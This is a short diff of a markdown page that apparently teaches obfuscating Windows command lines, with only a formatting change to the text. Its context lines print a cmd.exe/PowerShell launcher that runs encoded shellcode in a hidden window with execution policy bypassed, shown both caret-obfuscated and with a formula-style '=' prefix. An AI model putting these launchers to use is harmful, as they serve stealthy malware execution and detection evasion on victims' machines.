@@ -35,7 +35,7 @@ The above string can be obfuscated using the **batch special caracter: ^** <br /
 
       cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode
 
-- Any formula under the batch interpreter can be start with the follow special caracters: **@** or **=**
+- Any formula under the **batch interpreter** can be start with the follow special caracters: **@** or **=**
 
       =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
